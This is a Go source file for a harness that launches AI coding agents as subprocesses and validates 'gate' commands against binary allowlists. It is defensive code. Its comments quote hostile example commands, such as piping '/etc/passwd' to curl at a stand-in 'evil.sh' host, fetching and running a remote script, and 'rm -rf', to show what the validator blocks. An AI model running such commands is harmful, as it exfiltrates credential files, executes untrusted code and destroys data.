package harness

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"io"
	"os/exec"
	"strings"
	"sync"
	"time"
)

// AgentID identifies a supported AI agent.
type AgentID string

const (
	AgentClaude  AgentID = "claude"
	AgentCursor  AgentID = "cursor"
	AgentCodex   AgentID = "codex"
	AgentCopilot AgentID = "copilot"
	AgentGemini  AgentID = "gemini"
)

// AgentConfig holds configuration for an AI agent.
type AgentConfig struct {
	ID         AgentID
	Command    string
	Args       []string
	WorkingDir string
	MaxTokens  int
	Model      string
	Timeout    time.Duration // 0 = use DefaultAgentTimeout
}

// AgentResult is the output of an agent execution.
type AgentResult struct {
	Success    bool
	Output     string
	Error      string
	Duration   time.Duration
	TokensUsed int
}

// AgentRunner handles executing AI agents with streaming output and a
// security-first command allowlist. The runner rejects any agent command that
// is not in `allowedAgentCommands`, preventing prompt injection from
// hijacking the orchestrator into running arbitrary binaries (curl, rm,
// wget, etc.).
type AgentRunner struct {
	config AgentConfig
	mu     sync.Mutex
}

// DefaultAgentTimeout caps any single agent invocation. SDD features can take
// minutes to complete (LLM round-trips + tooling), but unbounded runs let a
// hung agent stall a feature forever.
const DefaultAgentTimeout = 10 * time.Minute

// DefaultGateTimeout caps any single gate (test runner, type-checker) run.
// Gates should be fast; a hung gate is almost always a sign of a flaky test
// or a deadlock that the harness should surface, not wait out.
const DefaultGateTimeout = 5 * time.Minute

// allowedAgentCommands is the closed set of binaries the harness is allowed
// to spawn as an AI agent. Anything else is refused with a clear error.
// Update this list when adding new adapters; do not loosen it on demand.
var allowedAgentCommands = map[string]struct{}{
	"claude":  {}, // Claude Code
	"codex":   {}, // OpenAI Codex CLI
	"cursor":  {}, // Cursor agent
	"copilot": {}, // GitHub Copilot CLI
	"gemini":  {}, // Gemini CLI
}

// allowedGateBinaries is the closed set of binaries that tasks.md may invoke
// as a "gate" command. Combined with `validateGateCommand` it prevents a
// malicious or naive spec from running `rm -rf` or `curl evil.sh | sh`.
//
// Read-only / no-side-effect commands (`echo`, `printf`, `true`, `false`,
// `pwd`, `cat`, `head`, `tail`, `wc`) are intentionally included because
// they're harmless and real-world tasks.md files use them as smoke
// checks. Anything that can mutate state outside the project directory
// (`rm`, `mv`, `cp`, `curl`, `wget`, `dd`, `chmod`, …) is excluded.
var allowedGateBinaries = map[string]struct{}{
	"node":       {},
	"npm":        {},
	"pnpm":       {},
	"yarn":       {},
	"bun":        {},
	"deno":       {},
	"go":         {},
	"make":       {},
	"pytest":     {},
	"python":     {},
	"python3":    {},
	"pip":        {},
	"cargo":      {},
	"rustc":      {},
	"jest":       {},
	"vitest":     {},
	"tsc":        {},
	"eslint":     {},
	"shellcheck": {},
	// Read-only / no-side-effect commands.
	"echo":   {},
	"printf": {},
	"true":   {},
	"false":  {},
	"pwd":    {},
	"cat":    {},
	"head":   {},
	"tail":   {},
	"wc":     {},
}

// NewAgentRunner creates a new agent runner. It validates the configured
// command against the allowlist and refuses to construct a runner for any
// binary outside the closed set. Callers that need to run a different
// binary must explicitly opt in (e.g. via a future plugin system).
func NewAgentRunner(cfg AgentConfig) (*AgentRunner, error) {
	if cfg.Command == "" {
		return nil, errors.New("agent command is empty")
	}
	// Strip path — only basename matters for the allowlist; full path is
	// resolved at exec time via $PATH so the runner still works after
	// `which` finds the binary in the user's environment.
	base := cfg.Command
	if idx := strings.LastIndexAny(base, "/\\"); idx >= 0 {
		base = base[idx+1:]
	}
	if _, ok := allowedAgentCommands[base]; !ok {
		return nil, fmt.Errorf("agent command %q is not in the allowlist (allowed: %s)",
			cfg.Command, strings.Join(sortedKeys(allowedAgentCommands), ", "))
	}
	if cfg.Timeout == 0 {
		cfg.Timeout = DefaultAgentTimeout
	}
	return &AgentRunner{config: cfg}, nil
}

// validateGateCommand checks that every binary invoked by a tasks.md gate
// resolves to a name in `allowedGateBinaries`. For compound expressions
// like `npm test && go test`, EACH binary (npm, go) is validated against
// the allowlist. Pipes (`|`), redirects (`<`, `>`), and command separators
// (`;`, single `&`) are rejected outright because they can smuggle
// exfiltration or destructive side effects past the allowlist (e.g.
// `cat /etc/passwd | curl evil.sh`).
func validateGateCommand(gate string) error {
	gate = strings.TrimSpace(gate)
	if gate == "" {
		return nil
	}
	// Reject any of the dangerous operators outright.
	for _, op := range []string{"|", "<", ">", ";", "&"} {
		// `&` alone (not `&&`) is also rejected; the && / || forms are
		// safe, so we let them through and split on them below.
		idx := strings.Index(gate, op)
		if idx < 0 {
			continue
		}
		// Allow `&&` (which contains a single `&` followed by `&`).
		if op == "&" && idx+1 < len(gate) && gate[idx+1] == '&' {
			continue
		}
		// Allow `||` (which contains a single `|` followed by `|`).
		if op == "|" && idx+1 < len(gate) && gate[idx+1] == '|' {
			continue
		}
		return fmt.Errorf("gate contains forbidden operator %q; only && and || are allowed for compound expressions", op)
	}
	// Split into top-level expressions on && and ||, then validate each.
	expressions := splitOnLogicalOps(gate)
	for _, expr := range expressions {
		expr = strings.TrimSpace(expr)
		if expr == "" {
			continue
		}
		parts := splitShellTokens(expr)
		if len(parts) == 0 {
			continue
		}
		var binary string
		for _, part := range parts {
			if part == "" || strings.HasPrefix(part, "-") || strings.Contains(part, "=") {
				continue
			}
			binary = part
			break
		}
		if binary == "" {
			continue
		}
		base := binary
		if idx := strings.LastIndexAny(base, "/\\"); idx >= 0 {
			base = base[idx+1:]
		}
		if _, ok := allowedGateBinaries[base]; !ok {
			return fmt.Errorf("gate binary %q is not in the allowlist (allowed: %s)",
				base, strings.Join(sortedKeys(allowedGateBinaries), ", "))
		}
	}
	return nil
}

// splitOnLogicalOps splits a string on `&&` and `||` only, leaving other
// characters (including single `&` and `|`, which we've already rejected)
// intact. Quotes are respected so `&&` inside a quoted string doesn't
// trigger a split.
func splitOnLogicalOps(s string) []string {
	var parts []string
	var current strings.Builder
	inSingle, inDouble := false, false
	runes := []rune(s)
	for i := 0; i < len(runes); i++ {
		r := runes[i]
		switch {
		case r == '\'' && !inDouble:
			inSingle = !inSingle
			current.WriteRune(r)
		case r == '"' && !inSingle:
			inDouble = !inDouble
			current.WriteRune(r)
		case !inSingle && !inDouble && r == '&' && i+1 < len(runes) && runes[i+1] == '&':
			parts = append(parts, current.String())
			current.Reset()
			i++ // skip second &
		case !inSingle && !inDouble && r == '|' && i+1 < len(runes) && runes[i+1] == '|':
			parts = append(parts, current.String())
			current.Reset()
			i++ // skip second |
		default:
			current.WriteRune(r)
		}
	}
	parts = append(parts, current.String())
	return parts
}

func isShellOperator(s string) bool {
	switch s {
	case "&&", "||", "|", ";", "&", ">", ">>", "<", "<<", "(", ")":
		return true
	}
	return false
}

// splitShellTokens is a deliberately tiny shell tokenizer — just enough to
// split compound commands. It handles double and single quotes so a token
// like `echo "build-ok"` doesn't get mis-parsed as a binary named
// `"build-ok"`. It does NOT handle escapes (`\"` inside a quoted string) or
// nested quotes; gate authors should keep gate commands simple.
func splitShellTokens(cmd string) []string {
	var tokens []string
	var current strings.Builder
	inSingle, inDouble := false, false
	flush := func() {
		if current.Len() > 0 {
			tokens = append(tokens, current.String())
			current.Reset()
		}
	}
	for _, r := range cmd {
		switch {
		case r == '\'' && !inDouble:
			inSingle = !inSingle
		case r == '"' && !inSingle:
			inDouble = !inDouble
		case (r == ' ' || r == '\t' || r == '\n') && !inSingle && !inDouble:
			flush()
		case (r == '&' || r == '|' || r == ';' || r == '>' || r == '<' || r == '(' || r == ')') && !inSingle && !inDouble:
			flush()
			tokens = append(tokens, string(r))
		default:
			current.WriteRune(r)
		}
	}
	flush()
	return tokens
}

// isShellOp reports whether s is a shell metacharacter that should be
// ignored when tokenizing a gate command. Duplicated from internal/engine
// (kept identical so a future refactor can extract to a shared package).
func isShellOp(s string) bool {
	switch s {
	case "&&", "||", "|", ";", "&", ">", ">>", "<", "<<", "(", ")":
		return true
	}
	return false
}

func sortedKeys(m map[string]struct{}) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	// Small maps; insertion-sort is fine and avoids pulling in `sort` for clarity.
	for i := 1; i < len(out); i++ {
		for j := i; j > 0 && out[j-1] > out[j]; j-- {
			out[j-1], out[j] = out[j], out[j-1]
		}
	}
	return out
}

// Run executes the agent with a prompt, streams output, and enforces a
// timeout. Cancellation propagates from ctx.
func (r *AgentRunner) Run(ctx context.Context, prompt string) (*AgentResult, error) {
	return r.RunStreaming(ctx, prompt, nil)
}

// RunStreaming executes the agent and calls onLine for each output line.
// Pass onLine=nil to discard output. The returned AgentResult carries the
// full captured output regardless of onLine.
func (r *AgentRunner) RunStreaming(ctx context.Context, prompt string, onLine func(line string)) (*AgentResult, error) {
	start := time.Now()

	timeout := r.config.Timeout
	if timeout == 0 {
		timeout = DefaultAgentTimeout
	}
	runCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	args := r.buildArgs(prompt)
	cmd := exec.CommandContext(runCtx, r.config.Command, args...)
	cmd.Dir = r.config.WorkingDir

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return nil, fmt.Errorf("stdout pipe: %w", err)
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return nil, fmt.Errorf("stderr pipe: %w", err)
	}

	if err := cmd.Start(); err != nil {
		return nil, fmt.Errorf("start agent: %w", err)
	}

	var (
		output strings.Builder
		wg     sync.WaitGroup
	)
	wg.Add(2)
	go func() {
		defer wg.Done()
		streamLines(stdout, &output, onLine, "    [agent] ")
	}()
	go func() {
		defer wg.Done()
		streamLines(stderr, nil, onLine, "    [agent:err] ")
	}()
	wg.Wait()

	waitErr := cmd.Wait()
	duration := time.Since(start)

	result := &AgentResult{
		Success:    waitErr == nil,
		Output:     output.String(),
		Duration:   duration,
		TokensUsed: EstimateTokens(prompt) + EstimateTokens(output.String()),
	}
	if waitErr != nil {
		// Surface the underlying error verbatim; if it was a timeout, the
		// context's err will say "context deadline exceeded" which is what
		// the caller needs to know whether to retry.
		result.Error = waitErr.Error()
		if errors.Is(runCtx.Err(), context.DeadlineExceeded) {
			result.Error = "agent timeout after " + timeout.String() + ": " + waitErr.Error()
		}
	}
	return result, nil
}

func streamLines(r io.Reader, into *strings.Builder, onLine func(string), prefix string) {
	scanner := bufio.NewScanner(r)
	// Allow long lines (LLM outputs can be huge single lines).
	scanner.Buffer(make([]byte, 0, 64*1024), 1024*1024)
	for scanner.Scan() {
		line := scanner.Text()
		if into != nil {
			into.WriteString(line)
			into.WriteByte('\n')
		}
		if onLine != nil {
			onLine(prefix + line)
		} else if prefix != "" {
			fmt.Println(prefix + line)
		}
	}
}

// buildArgs constructs the command arguments for the agent.
func (r *AgentRunner) buildArgs(prompt string) []string {
	switch r.config.ID {
	case AgentClaude:
		args := []string{"-p", prompt}
		if r.config.Model != "" {
			args = append(args, "--model", r.config.Model)
		}
		return append(args, r.config.Args...)
	default:
		// Cursor, Codex, Copilot, Gemini all accept `-p <prompt>` style.
		return append([]string{"-p", prompt}, r.config.Args...)
	}
}

// DetectAgent finds the best available AI agent on the system by scanning
// $PATH. Order is alphabetical and vendor-neutral — no agent is privileged.
// The first one found wins; if you want a specific agent, pass it via
// `radiant run --agent=…` rather than relying on detection.
func DetectAgent() (AgentID, string) {
	priority := []AgentID{AgentClaude, AgentCodex, AgentCopilot, AgentCursor, AgentGemini}
	for _, id := range priority {
		cmd := string(id)
		if _, err := exec.LookPath(cmd); err == nil {
			return id, cmd
		}
	}
	return "", ""
}

// IsAgentAvailable checks if a specific agent is installed and in the
// allowlist. Useful for `--agent=foo` flag validation before scheduling.
func IsAgentAvailable(command string) bool {
	base := command
	if idx := strings.LastIndexAny(base, "/\\"); idx >= 0 {
		base = base[idx+1:]
	}
	if _, ok := allowedAgentCommands[base]; !ok {
		return false
	}
	_, err := exec.LookPath(command)
	return err == nil
}
